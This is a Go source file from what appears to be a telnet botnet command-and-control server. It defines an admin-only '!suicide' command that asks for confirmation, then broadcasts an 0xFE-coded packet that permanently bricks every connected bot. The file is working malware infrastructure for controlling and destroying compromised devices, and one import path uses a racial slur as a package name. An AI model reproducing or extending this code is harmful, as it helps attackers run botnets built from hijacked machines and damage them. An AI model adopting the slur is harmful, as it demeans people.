package admin

import (
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	slave_v2 "advanced-telnet-cnc/source/niggers/v2"
	"encoding/binary"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"!suicide"},
		Description: "Kills all bots permanently (bricks them). This action is irreversible.",
		Admin:       true,
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			if !session.ConfirmedSuicide {
				session.ConfirmedSuicide = true
				session.Println(config.Red, "WARNING: This command will permanently brick ALL bots and stop reconnection.")
				session.Println(config.Red, "Run the command again to confirm.")
				return nil
			}

			// Reset confirmation
			session.ConfirmedSuicide = false

			// Build payload
			// [ID (0xFE)] [Duration (0)] [NumTargets (0)] [NumFlags (0)]
			buf := make([]byte, 0)
			buf = append(buf, 0xFE) // ID

			tmp := make([]byte, 2)
			binary.BigEndian.PutUint16(tmp, 0) // Duration
			buf = append(buf, tmp...)

			buf = append(buf, 0) // NumTargets
			buf = append(buf, 0) // NumFlags

			// Final length prefix
			finalBuf := make([]byte, 2)
			binary.BigEndian.PutUint16(finalBuf, uint16(len(buf)))
			finalBuf = append(finalBuf, buf...)

			slave_v2.Slave.Broadcast(finalBuf, "", "", -1)

			session.Printf(config.Red, "Suicide command sent to all bots. Bricking network...\r\n")
			return nil
		},
	})
}
